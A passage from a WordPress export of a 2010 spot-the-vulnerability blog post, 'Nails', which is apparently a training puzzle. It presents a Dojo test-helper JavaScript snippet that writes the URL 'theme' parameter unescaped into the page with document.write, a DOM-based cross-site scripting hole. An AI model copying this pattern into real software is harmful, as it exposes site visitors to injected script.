		<category domain="post_tag" nicename="string-password"><![CDATA[string password]]></category>
		<category domain="post_tag" nicename="string-url"><![CDATA[string url]]></category>
		<category domain="post_tag" nicename="string-username"><![CDATA[string username]]></category>
		<category domain="post_tag" nicename="stringutils"><![CDATA[stringutils]]></category>
		<category domain="post_tag" nicename="url-parameter"><![CDATA[url parameter]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[Drop Top - Cross Site Scripting]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[Drop Top - Cross Site Scripting]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[84b0ecf8806ba60ea50d56fa2863167a]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/cumr7r]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Nails</title>
		<link>http://spotthevuln.com/2010/07/nails/</link>
		<pubDate>Mon, 19 Jul 2010 15:00:14 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=952</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong><span class="body">I like Nine Inch Nails, and I like hip-hop.</span></strong>
<strong> -Axl Rose
</strong></blockquote>
[ccnLe_javascript]
if(window.location.href.indexOf("?") &gt; -1){
var str = window.location.href.substr(window.location.href.indexOf("?")+1).split(/#/);
var ary  = str[0].split(/&amp;/);
for(var i=0; i&lt;ary.length; i++){
var split = ary[i].split(/=/),
key = split[0],
value = split[1];
switch(key){
case "locale":
// locale string | null
dojo.config.locale = locale = value;
break;
case "dir":
// rtl | null
document.getElementsByTagName("html")[0].dir = value;
break;
case "theme":
// tundra | soria | noir | squid | nihilo | null
theme = value;
break;
case "a11y":
if(value){ testMode = "dijit_a11y"; }
}
}
}

// always include the default theme files:
if(theme || testMode){

if(theme){
var themeCss = d.moduleUrl("dijit.themes",theme+"/"+theme+".css");
var themeCssRtl = d.moduleUrl("dijit.themes",theme+"/"+theme+"_rtl.css");
document.write('&lt;link rel="stylesheet" type="text/css" href="'+themeCss+'"&gt;');
document.write('&lt;link rel="stylesheet" type="text/css" href="'+themeCssRtl+'"&gt;');
}

if(dojo.config.parseOnLoad){
dojo.config.parseOnLoad = false;
dojo.config._deferParsing = true;
}

d.addOnLoad(function(){

// set the classes
var b = dojo.body();
if(theme){
dojo.removeClass(b, defTheme);
if(!d.hasClass(b, theme)){ d.addClass(b, theme); }
var n = d.byId("themeStyles");
if(n){ d.destroy(n); }
}
if(testMode){ d.addClass(b, testMode); }
if(dojo.config._deferParsing){
// attempt to elimiate race condition introduced by this
// test helper file.  120ms to allow CSS to finish/process?
setTimeout(dojo.hitch(d.parser, "parse", b), 120);
}

});
}

})();
[/ccnLe_javascript]
<div id="_mcePaste" style="position: absolute; left: -10000px; top: 0px; width: 1px; height: 1px; overflow: hidden;"><!--[if gte mso 9]><xml> <w:WordDocument> <w:View>Normal</w:View> <w:Zoom>0</w:Zoom> <w:TrackMoves /> <w:TrackFormatting /> <w:PunctuationKerning /> <w:ValidateAgainstSchemas /> <w:SaveIfXMLInvalid>false</w:SaveIfXMLInvalid> <w:IgnoreMixedContent>false</w:IgnoreMixedContent> <w:AlwaysShowPlaceholderText>false</w:AlwaysShowPlaceholderText> <w:DoNotPromoteQF /> <w:LidThemeOther>EN-US</w:LidThemeOther> <w:LidThemeAsian>X-NONE</w:LidThemeAsian> <w:LidThemeComplexScript>X-NONE</w:LidThemeComplexScript> <w:Compatibility> <w:BreakWrappedTables /> <w:SnapToGridInCell /> <w:WrapTextWithPunct /> <w:UseAsianBreakRules /> <w:DontGrowAutofit /> <w:SplitPgBreakAndParaMark /> <w:DontVertAlignCellWithSp /> <w:DontBreakConstrainedForcedTables /> <w:DontVertAlignInTxbx /> <w:Word11KerningPairs /> <w:CachedColBalance /> </w:Compatibility> <w:BrowserLevel>MicrosoftInternetExplorer4</w:BrowserLevel> <m:mathPr> <m:mathFont m:val="Cambria Math" /> <m:brkBin m:val="before" /> <m:brkBinSub m:val="&#45;-" /> <m:smallFrac m:val="off" /> <m:dispDef /> <m:lMargin m:val="0" /> <m:rMargin m:val="0" /> <m:defJc m:val="centerGroup" /> <m:wrapIndent m:val="1440" /> <m:intLim m:val="subSup" /> <m:naryLim m:val="undOvr" /> </m:mathPr></w:WordDocument> </xml><![endif]--><!--[if gte mso 9]><xml> <w:LatentStyles DefLockedState="false" DefUnhideWhenUsed="true"   DefSemiHidden="true" DefQFormat="false" DefPriority="99"   LatentStyleCount="267"> <w:LsdException Locked="false" Priority="0" SemiHidden="false"    UnhideWhenUsed="false" QFormat="true" Name="Normal" /> <w:LsdException Locked="false" Priority="9" SemiHidden="false"    UnhideWhenUsed="false" QFormat="true" Name="heading 1" /> <w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 2" /> <w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 3" /> <w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 4" /> <w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 5" /> <w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 6" /> <w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 7" /> <w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 8" /> <w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 9" /> <w:LsdException Locked="false" Priority="39" Name="toc 1" /> <w:LsdException Locked="false" Priority="39" Name="toc 2" /> <w:LsdException Locked="false" Priority="39" Name="toc 3" /> <w:LsdException Locked="false" Priority="39" Name="toc 4" /> <w:LsdException Locked="false" Priority="39" Name="toc 5" /> <w:LsdException Locked="false" Priority="39" Name="toc 6" /> <w:LsdException Locked="false" Priority="39" Name="toc 7" /> <w:LsdException Locked="false" Priority="39" Name="toc 8" /> <w:LsdException Locked="false" Priority="39" Name="toc 9" /> <w:LsdException Locked="false" Priority="35" QFormat="true" Name="caption" /> <w:LsdException Locked="false" Priority="10" SemiHidden="false"    UnhideWhenUsed="false" QFormat="true" Name="Title" /> <w:LsdException Locked="false" Priority="1" Name="Default Paragraph Font" /> <w:LsdException Locked="false" Priority="11" SemiHidden="false"    UnhideWhenUsed="false" QFormat="true" Name="Subtitle" /> <w:LsdException Locked="false" Priority="22" SemiHidden="false"    UnhideWhenUsed="false" QFormat="true" Name="Strong" /> <w:LsdException Locked="false" Priority="20" SemiHidden="false"    UnhideWhenUsed="false" QFormat="true" Name="Emphasis" /> <w:LsdException Locked="false" Priority="59" SemiHidden="false"    UnhideWhenUsed="false" Name="Table Grid" /> <w:LsdException Locked="false" UnhideWhenUsed="false" Name="Placeholder Text" /> <w:LsdException Locked="false" Priority="1" SemiHidden="false"    UnhideWhenUsed="false" QFormat="true" Name="No Spacing" /> <w:LsdException Locked="false" Priority="60" SemiHidden="false"    UnhideWhenUsed="false" Name="Light Shading" /> <w:LsdException Locked="false" Priority="61" SemiHidden="false"    UnhideWhenUsed="false" Name="Light List" /> <w:LsdException Locked="false" Priority="62" SemiHidden="false"    UnhideWhenUsed="false" Name="Light Grid" /> <w:LsdException Locked="false" Priority="63" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Shading 1" /> <w:LsdException Locked="false" Priority="64" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Shading 2" /> <w:LsdException Locked="false" Priority="65" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium List 1" /> <w:LsdException Locked="false" Priority="66" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium List 2" /> <w:LsdException Locked="false" Priority="67" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 1" /> <w:LsdException Locked="false" Priority="68" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 2" /> <w:LsdException Locked="false" Priority="69" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 3" /> <w:LsdException Locked="false" Priority="70" SemiHidden="false"    UnhideWhenUsed="false" Name="Dark List" /> <w:LsdException Locked="false" Priority="71" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful Shading" /> <w:LsdException Locked="false" Priority="72" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful List" /> <w:LsdException Locked="false" Priority="73" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful Grid" /> <w:LsdException Locked="false" Priority="60" SemiHidden="false"    UnhideWhenUsed="false" Name="Light Shading Accent 1" /> <w:LsdException Locked="false" Priority="61" SemiHidden="false"    UnhideWhenUsed="false" Name="Light List Accent 1" /> <w:LsdException Locked="false" Priority="62" SemiHidden="false"    UnhideWhenUsed="false" Name="Light Grid Accent 1" /> <w:LsdException Locked="false" Priority="63" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Shading 1 Accent 1" /> <w:LsdException Locked="false" Priority="64" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Shading 2 Accent 1" /> <w:LsdException Locked="false" Priority="65" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium List 1 Accent 1" /> <w:LsdException Locked="false" UnhideWhenUsed="false" Name="Revision" /> <w:LsdException Locked="false" Priority="34" SemiHidden="false"    UnhideWhenUsed="false" QFormat="true" Name="List Paragraph" /> <w:LsdException Locked="false" Priority="29" SemiHidden="false"    UnhideWhenUsed="false" QFormat="true" Name="Quote" /> <w:LsdException Locked="false" Priority="30" SemiHidden="false"    UnhideWhenUsed="false" QFormat="true" Name="Intense Quote" /> <w:LsdException Locked="false" Priority="66" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium List 2 Accent 1" /> <w:LsdException Locked="false" Priority="67" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 1 Accent 1" /> <w:LsdException Locked="false" Priority="68" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 2 Accent 1" /> <w:LsdException Locked="false" Priority="69" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 3 Accent 1" /> <w:LsdException Locked="false" Priority="70" SemiHidden="false"    UnhideWhenUsed="false" Name="Dark List Accent 1" /> <w:LsdException Locked="false" Priority="71" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful Shading Accent 1" /> <w:LsdException Locked="false" Priority="72" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful List Accent 1" /> <w:LsdException Locked="false" Priority="73" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful Grid Accent 1" /> <w:LsdException Locked="false" Priority="60" SemiHidden="false"    UnhideWhenUsed="false" Name="Light Shading Accent 2" /> <w:LsdException Locked="false" Priority="61" SemiHidden="false"    UnhideWhenUsed="false" Name="Light List Accent 2" /> <w:LsdException Locked="false" Priority="62" SemiHidden="false"    UnhideWhenUsed="false" Name="Light Grid Accent 2" /> <w:LsdException Locked="false" Priority="63" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Shading 1 Accent 2" /> <w:LsdException Locked="false" Priority="64" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Shading 2 Accent 2" /> <w:LsdException Locked="false" Priority="65" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium List 1 Accent 2" /> <w:LsdException Locked="false" Priority="66" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium List 2 Accent 2" /> <w:LsdException Locked="false" Priority="67" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 1 Accent 2" /> <w:LsdException Locked="false" Priority="68" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 2 Accent 2" /> <w:LsdException Locked="false" Priority="69" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 3 Accent 2" /> <w:LsdException Locked="false" Priority="70" SemiHidden="false"    UnhideWhenUsed="false" Name="Dark List Accent 2" /> <w:LsdException Locked="false" Priority="71" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful Shading Accent 2" /> <w:LsdException Locked="false" Priority="72" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful List Accent 2" /> <w:LsdException Locked="false" Priority="73" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful Grid Accent 2" /> <w:LsdException Locked="false" Priority="60" SemiHidden="false"    UnhideWhenUsed="false" Name="Light Shading Accent 3" /> <w:LsdException Locked="false" Priority="61" SemiHidden="false"    UnhideWhenUsed="false" Name="Light List Accent 3" /> <w:LsdException Locked="false" Priority="62" SemiHidden="false"    UnhideWhenUsed="false" Name="Light Grid Accent 3" /> <w:LsdException Locked="false" Priority="63" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Shading 1 Accent 3" /> <w:LsdException Locked="false" Priority="64" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Shading 2 Accent 3" /> <w:LsdException Locked="false" Priority="65" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium List 1 Accent 3" /> <w:LsdException Locked="false" Priority="66" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium List 2 Accent 3" /> <w:LsdException Locked="false" Priority="67" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 1 Accent 3" /> <w:LsdException Locked="false" Priority="68" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 2 Accent 3" /> <w:LsdException Locked="false" Priority="69" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 3 Accent 3" /> <w:LsdException Locked="false" Priority="70" SemiHidden="false"    UnhideWhenUsed="false" Name="Dark List Accent 3" /> <w:LsdException Locked="false" Priority="71" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful Shading Accent 3" /> <w:LsdException Locked="false" Priority="72" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful List Accent 3" /> <w:LsdException Locked="false" Priority="73" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful Grid Accent 3" /> <w:LsdException Locked="false" Priority="60" SemiHidden="false"    UnhideWhenUsed="false" Name="Light Shading Accent 4" /> <w:LsdException Locked="false" Priority="61" SemiHidden="false"    UnhideWhenUsed="false" Name="Light List Accent 4" /> <w:LsdException Locked="false" Priority="62" SemiHidden="false"    UnhideWhenUsed="false" Name="Light Grid Accent 4" /> <w:LsdException Locked="false" Priority="63" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Shading 1 Accent 4" /> <w:LsdException Locked="false" Priority="64" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Shading 2 Accent 4" /> <w:LsdException Locked="false" Priority="65" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium List 1 Accent 4" /> <w:LsdException Locked="false" Priority="66" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium List 2 Accent 4" /> <w:LsdException Locked="false" Priority="67" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 1 Accent 4" /> <w:LsdException Locked="false" Priority="68" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 2 Accent 4" /> <w:LsdException Locked="false" Priority="69" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 3 Accent 4" /> <w:LsdException Locked="false" Priority="70" SemiHidden="false"    UnhideWhenUsed="false" Name="Dark List Accent 4" /> <w:LsdException Locked="false" Priority="71" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful Shading Accent 4" /> <w:LsdException Locked="false" Priority="72" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful List Accent 4" /> <w:LsdException Locked="false" Priority="73" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful Grid Accent 4" /> <w:LsdException Locked="false" Priority="60" SemiHidden="false"    UnhideWhenUsed="false" Name="Light Shading Accent 5" /> <w:LsdException Locked="false" Priority="61" SemiHidden="false"    UnhideWhenUsed="false" Name="Light List Accent 5" /> <w:LsdException Locked="false" Priority="62" SemiHidden="false"    UnhideWhenUsed="false" Name="Light Grid Accent 5" /> <w:LsdException Locked="false" Priority="63" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Shading 1 Accent 5" /> <w:LsdException Locked="false" Priority="64" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Shading 2 Accent 5" /> <w:LsdException Locked="false" Priority="65" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium List 1 Accent 5" /> <w:LsdException Locked="false" Priority="66" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium List 2 Accent 5" /> <w:LsdException Locked="false" Priority="67" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 1 Accent 5" /> <w:LsdException Locked="false" Priority="68" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 2 Accent 5" /> <w:LsdException Locked="false" Priority="69" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 3 Accent 5" /> <w:LsdException Locked="false" Priority="70" SemiHidden="false"    UnhideWhenUsed="false" Name="Dark List Accent 5" /> <w:LsdException Locked="false" Priority="71" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful Shading Accent 5" /> <w:LsdException Locked="false" Priority="72" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful List Accent 5" /> <w:LsdException Locked="false" Priority="73" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful Grid Accent 5" /> <w:LsdException Locked="false" Priority="60" SemiHidden="false"    UnhideWhenUsed="false" Name="Light Shading Accent 6" /> <w:LsdException Locked="false" Priority="61" SemiHidden="false"    UnhideWhenUsed="false" Name="Light List Accent 6" /> <w:LsdException Locked="false" Priority="62" SemiHidden="false"    UnhideWhenUsed="false" Name="Light Grid Accent 6" /> <w:LsdException Locked="false" Priority="63" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Shading 1 Accent 6" /> <w:LsdException Locked="false" Priority="64" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Shading 2 Accent 6" /> <w:LsdException Locked="false" Priority="65" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium List 1 Accent 6" /> <w:LsdException Locked="false" Priority="66" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium List 2 Accent 6" /> <w:LsdException Locked="false" Priority="67" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 1 Accent 6" /> <w:LsdException Locked="false" Priority="68" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 2 Accent 6" /> <w:LsdException Locked="false" Priority="69" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 3 Accent 6" /> <w:LsdException Locked="false" Priority="70" SemiHidden="false"    UnhideWhenUsed="false" Name="Dark List Accent 6" /> <w:LsdException Locked="false" Priority="71" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful Shading Accent 6" /> <w:LsdException Locked="false" Priority="72" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful List Accent 6" /> <w:LsdException Locked="false" Priority="73" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful Grid Accent 6" /> <w:LsdException Locked="false" Priority="19" SemiHidden="false"    UnhideWhenUsed="false" QFormat="true" Name="Subtle Emphasis" /> <w:LsdException Locked="false" Priority="21" SemiHidden="false"    UnhideWhenUsed="false" QFormat="true" Name="Intense Emphasis" /> <w:LsdException Locked="false" Priority="31" SemiHidden="false"    UnhideWhenUsed="false" QFormat="true" Name="Subtle Reference" /> <w:LsdException Locked="false" Priority="32" SemiHidden="false"    UnhideWhenUsed="false" QFormat="true" Name="Intense Reference" /> <w:LsdException Locked="false" Priority="33" SemiHidden="false"    UnhideWhenUsed="false" QFormat="true" Name="Book Title" /> <w:LsdException Locked="false" Priority="37" Name="Bibliography" /> <w:LsdException Locked="false" Priority="39" QFormat="true" Name="TOC Heading" /> </w:LatentStyles> </xml><![endif]--><!--  /* Font Definitions */  @font-face 	{font-family:"Cambria Math"; 	panose-1:2 4 5 3 5 4 6 3 2 4; 	mso-font-charset:1; 	mso-generic-font-family:roman; 	mso-font-format:other; 	mso-font-pitch:variable; 	mso-font-signature:0 0 0 0 0 0;} @font-face 	{font-family:Calibri; 	panose-1:2 15 5 2 2 2 4 3 2 4; 	mso-font-charset:0; 	mso-generic-font-family:swiss; 	mso-font-pitch:variable; 	mso-font-signature:-520092929 1073786111 9 0 415 0;}  /* Style Definitions */  p.MsoNormal, li.MsoNormal, div.MsoNormal 	{mso-style-unhide:no; 	mso-style-qformat:yes; 	mso-style-parent:""; 	margin-top:0in; 	margin-right:0in; 	margin-bottom:10.0pt; 	margin-left:0in; 	line-height:115%; 	mso-pagination:widow-orphan; 	font-size:11.0pt; 	font-family:"Calibri","sans-serif"; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:Calibri; 	mso-fareast-theme-font:minor-latin; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:"Times New Roman"; 	mso-bidi-theme-font:minor-bidi;} .MsoChpDefault 	{mso-style-type:export-only; 	mso-default-props:yes; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:Calibri; 	mso-fareast-theme-font:minor-latin; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:"Times New Roman"; 	mso-bidi-theme-font:minor-bidi;} .MsoPapDefault 	{mso-style-type:export-only; 	margin-bottom:10.0pt; 	line-height:115%;} @page WordSection1 	{size:8.5in 11.0in; 	margin:1.0in 1.0in 1.0in 1.0in; 	mso-header-margin:.5in; 	mso-footer-margin:.5in; 	mso-paper-source:0;} div.WordSection1 	{page:WordSection1;} --><!--[if gte mso 10]> <mce:style><!   /* Style Definitions */  table.MsoNormalTable 	{mso-style-name:"Table Normal"; 	mso-tstyle-rowband-size:0; 	mso-tstyle-colband-size:0; 	mso-style-noshow:yes; 	mso-style-priority:99; 	mso-style-qformat:yes; 	mso-style-parent:""; 	mso-padding-alt:0in 5.4pt 0in 5.4pt; 	mso-para-margin-top:0in; 	mso-para-margin-right:0in; 	mso-para-margin-bottom:10.0pt; 	mso-para-margin-left:0in; 	line-height:115%; 	mso-pagination:widow-orphan; 	font-size:11.0pt; 	font-family:"Calibri","sans-serif"; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:"Times New Roman"; 	mso-fareast-theme-font:minor-fareast; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:"Times New Roman"; 	mso-bidi-theme-font:minor-bidi;} --> <!--[endif]-->
<p class="MsoNormal"></p>
<p class="MsoNormal"></p>
<p class="MsoNormal"><span> </span>if(window.location.href.indexOf("?") &gt; -1){</p>
<p class="MsoNormal"><span> </span>var str = window.location.href.substr(window.location.href.indexOf("?")+1).split(/#/);</p>
<p class="MsoNormal"><span> </span>var ary<span> </span>= str[0].split(/&amp;/);</p>
<p class="MsoNormal"><span> </span>for(var i=0; i&lt;ary.length; i++){</p>
<p class="MsoNormal"><span> </span>var split = ary[i].split(/=/),</p>
<p class="MsoNormal"><span> </span>key = split[0],</p>
<p class="MsoNormal"><span> </span>value = split[1];</p>
<p class="MsoNormal"><span> </span>switch(key){</p>
<p class="MsoNormal"><span> </span>case "locale":</p>
<p class="MsoNormal"><span> </span>// locale string | null</p>
<p class="MsoNormal"><span> </span>dojo.config.locale = locale = value;</p>
<p class="MsoNormal"><span> </span>break;</p>
<p class="MsoNormal"><span> </span>case "dir":</p>
<p class="MsoNormal"><span> </span>// rtl | null</p>
<p class="MsoNormal"><span> </span>document.getElementsByTagName("html")[0].dir = value;</p>
<p class="MsoNormal"><span> </span><span> </span>break;</p>
<p class="MsoNormal"><span> </span>case "theme":</p>
<p class="MsoNormal"><span> </span>// tundra | soria | noir | squid | nihilo | null</p>
<p class="MsoNormal"><span> </span>theme = value;</p>
<p class="MsoNormal"><span> </span>break;</p>
<p class="MsoNormal"><span> </span>case "a11y":</p>
<p class="MsoNormal"><span> </span>if(value){ testMode = "dijit_a11y"; }</p>
<p class="MsoNormal"><span> </span>}</p>
<p class="MsoNormal"><span> </span>}</p>
<p class="MsoNormal"><span> </span>}</p>
<p class="MsoNormal"></p>
<p class="MsoNormal"><span> </span>// always include the default theme files:</p>
<p class="MsoNormal"><span> </span>if(theme || testMode){</p>
<p class="MsoNormal"></p>
<p class="MsoNormal"><span> </span>if(theme){</p>
<p class="MsoNormal"><span> </span>var themeCss = d.moduleUrl("dijit.themes",theme+"/"+theme+".css");</p>
<p class="MsoNormal"><span> </span>var themeCssRtl = d.moduleUrl("dijit.themes",theme+"/"+theme+"_rtl.css");</p>
<p class="MsoNormal"><span> </span>document.write('&lt;link rel="stylesheet" type="text/css" href="'+themeCss+'"&gt;');</p>
<p class="MsoNormal"><span> </span>document.write('&lt;link rel="stylesheet" type="text/css" href="'+themeCssRtl+'"&gt;');</p>
<p class="MsoNormal"><span> </span>}</p>
<p class="MsoNormal"></p>
<p class="MsoNormal"><span> </span>if(dojo.config.parseOnLoad){</p>
<p class="MsoNormal"><span> </span>dojo.config.parseOnLoad = false;</p>
<p class="MsoNormal"><span> </span>dojo.config._deferParsing = true;</p>
<p class="MsoNormal"><span> </span>}</p>
<p class="MsoNormal"></p>
<p class="MsoNormal"><span> </span>d.addOnLoad(function(){</p>
<p class="MsoNormal"></p>
<p class="MsoNormal"><span> </span>// set the classes</p>
<p class="MsoNormal"><span> </span>var b = dojo.body();</p>
<p class="MsoNormal"><span> </span>if(theme){</p>
<p class="MsoNormal"><span> </span>dojo.removeClass(b, defTheme);</p>
<p class="MsoNormal"><span> </span>if(!d.hasClass(b, theme)){ d.addClass(b, theme); }</p>
<p class="MsoNormal"><span> </span>var n = d.byId("themeStyles");</p>
<p class="MsoNormal"><span> </span>if(n){ d.destroy(n); }</p>
<p class="MsoNormal"><span> </span>}</p>
<p class="MsoNormal"><span> </span>if(testMode){ d.addClass(b, testMode); }</p>
<p class="MsoNormal"><span> </span>if(dojo.config._deferParsing){</p>
<p class="MsoNormal"><span> </span><span> </span>// attempt to elimiate race condition introduced by this</p>
<p class="MsoNormal"><span> </span>// test helper file.<span> </span>120ms to allow CSS to finish/process?</p>
<p class="MsoNormal"><span> </span>setTimeout(dojo.hitch(d.parser, "parse", b), 120);</p>
<p class="MsoNormal"><span> </span>}</p>
<p class="MsoNormal"></p>
<p class="MsoNormal"><span> </span>});</p>
<p class="MsoNormal"><span> </span>}</p>
<p class="MsoNormal"></p>
<p class="MsoNormal">})();</p>

</div>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>952</wp:post_id>
		<wp:post_date>2010-07-19 08:00:14</wp:post_date>
		<wp:post_date_gmt>2010-07-19 15:00:14</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>nails</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="javascript"><![CDATA[JavaScript]]></category>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/cs186F]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[2a0f54ef960a1e69e34c626bf5df07c4]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
